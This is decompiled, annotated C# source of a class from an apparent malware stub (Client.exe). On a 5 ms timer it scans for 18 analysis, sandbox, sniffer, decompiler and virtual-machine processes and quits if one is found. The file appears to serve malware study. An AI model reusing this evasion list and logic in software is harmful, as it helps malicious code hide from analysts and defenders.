// Decompiled with JetBrains decompiler
// Type: Stub.CsAntiProcess
// Assembly: Stub, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 292CE86C-33B7-4D1B-9DE2-B41CEB9702D8
// Assembly location: C:\Users\User\Desktop\Client.exe

using j;
using Microsoft.VisualBasic.CompilerServices;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Timers;
/**
 * @file CsAntiProcess.cs
 * @brief Implements anti-analysis measures by monitoring and terminating forbidden processes.
 *
 * This class periodically checks for the presence of known debugging or analysis tools and 
 * terminates the application if any such process is detected.
 */
#nullable disable
namespace Stub
{
  public class CsAntiProcess
  {
    // Timer used to schedule periodic checks.

    private static Timer Timer;
    // Instance of OK (its functionality is used for anti-analysis, though details are external).

    private static OK N = new OK();

    /**
 * @brief Handler for the timer event that checks for unwanted processes.
 *
 * This function scans for a list of known analysis tool process names. If any are found,
 * the application is terminated immediately.
 *
 * @param sender The source of the event.
 * @param e The elapsed event arguments.
 */

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    public static void Handler(object sender, ElapsedEventArgs e)
    {
      // Check for "procexp" processes.
      Process[] processesByName1 = Process.GetProcessesByName("procexp");
      int index1 = 0;
      while (index1 < processesByName1.Length)
      {
        Process process = processesByName1[index1];
        // Terminate application if process is found.
        ProjectData.EndApp();
        checked { ++index1; }
      }
      // Check for other known analysis tool processes...
      Process[] processesByName2 = Process.GetProcessesByName("SbieCtrl");
      int index2 = 0;
      while (index2 < processesByName2.Length)
      {
        Process process = processesByName2[index2];
        ProjectData.EndApp();
        checked { ++index2; }
      }
      Process[] processesByName3 = Process.GetProcessesByName("SpyTheSpy");
      int index3 = 0;
      while (index3 < processesByName3.Length)
      {
        Process process = processesByName3[index3];
        ProjectData.EndApp();
        checked { ++index3; }
      }
      Process[] processesByName4 = Process.GetProcessesByName("wireshark");
      int index4 = 0;
      while (index4 < processesByName4.Length)
      {
        Process process = processesByName4[index4];
        ProjectData.EndApp();
        checked { ++index4; }
      }
      Process[] processesByName5 = Process.GetProcessesByName("apateDNS");
      int index5 = 0;
      while (index5 < processesByName5.Length)
      {
        Process process = processesByName5[index5];
        ProjectData.EndApp();
        checked { ++index5; }
      }
      Process[] processesByName6 = Process.GetProcessesByName("IPBlocker");
      int index6 = 0;
      while (index6 < processesByName6.Length)
      {
        Process process = processesByName6[index6];
        ProjectData.EndApp();
        checked { ++index6; }
      }
      Process[] processesByName7 = Process.GetProcessesByName("TiGeR-Firewall");
      int index7 = 0;
      while (index7 < processesByName7.Length)
      {
        Process process = processesByName7[index7];
        ProjectData.EndApp();
        checked { ++index7; }
      }
      Process[] processesByName8 = Process.GetProcessesByName("smsniff");
      int index8 = 0;
      while (index8 < processesByName8.Length)
      {
        Process process = processesByName8[index8];
        ProjectData.EndApp();
        checked { ++index8; }
      }
      Process[] processesByName9 = Process.GetProcessesByName("exeinfoPE");
      int index9 = 0;
      while (index9 < processesByName9.Length)
      {
        Process process = processesByName9[index9];
        ProjectData.EndApp();
        checked { ++index9; }
      }
      Process[] processesByName10 = Process.GetProcessesByName("NetSnifferCs");
      int index10 = 0;
      while (index10 < processesByName10.Length)
      {
        Process process = processesByName10[index10];
        ProjectData.EndApp();
        checked { ++index10; }
      }
      Process[] processesByName11 = Process.GetProcessesByName("Sandboxie Control");
      int index11 = 0;
      while (index11 < processesByName11.Length)
      {
        Process process = processesByName11[index11];
        ProjectData.EndApp();
        checked { ++index11; }
      }
      Process[] processesByName12 = Process.GetProcessesByName("processhacker");
      int index12 = 0;
      while (index12 < processesByName12.Length)
      {
        Process process = processesByName12[index12];
        ProjectData.EndApp();
        checked { ++index12; }
      }
      Process[] processesByName13 = Process.GetProcessesByName("dnSpy");
      int index13 = 0;
      while (index13 < processesByName13.Length)
      {
        Process process = processesByName13[index13];
        ProjectData.EndApp();
        checked { ++index13; }
      }
      Process[] processesByName14 = Process.GetProcessesByName("CodeReflect");
      int index14 = 0;
      while (index14 < processesByName14.Length)
      {
        Process process = processesByName14[index14];
        ProjectData.EndApp();
        checked { ++index14; }
      }
      Process[] processesByName15 = Process.GetProcessesByName("Reflector");
      int index15 = 0;
      while (index15 < processesByName15.Length)
      {
        Process process = processesByName15[index15];
        ProjectData.EndApp();
        checked { ++index15; }
      }
      Process[] processesByName16 = Process.GetProcessesByName("ILSpy");
      int index16 = 0;
      while (index16 < processesByName16.Length)
      {
        Process process = processesByName16[index16];
        ProjectData.EndApp();
        checked { ++index16; }
      }
      Process[] processesByName17 = Process.GetProcessesByName("VGAuthService");
      int index17 = 0;
      while (index17 < processesByName17.Length)
      {
        Process process = processesByName17[index17];
        ProjectData.EndApp();
        checked { ++index17; }
      }
      Process[] processesByName18 = Process.GetProcessesByName("VBoxService");
      int index18 = 0;
      while (index18 < processesByName18.Length)
      {
        Process process = processesByName18[index18];
        ProjectData.EndApp();
        checked { ++index18; }
      }
    }
    /**
     * @brief Initializes and starts the anti-process timer.
     *
     * This function sets up a timer that triggers the Handler method every 5 milliseconds.
     */
    public static void Start()
    {
      CsAntiProcess.Timer = new Timer(5.0);
      CsAntiProcess.Timer.Elapsed += new ElapsedEventHandler(CsAntiProcess.Handler);
      CsAntiProcess.Timer.Enabled = true;
    }
  }
}
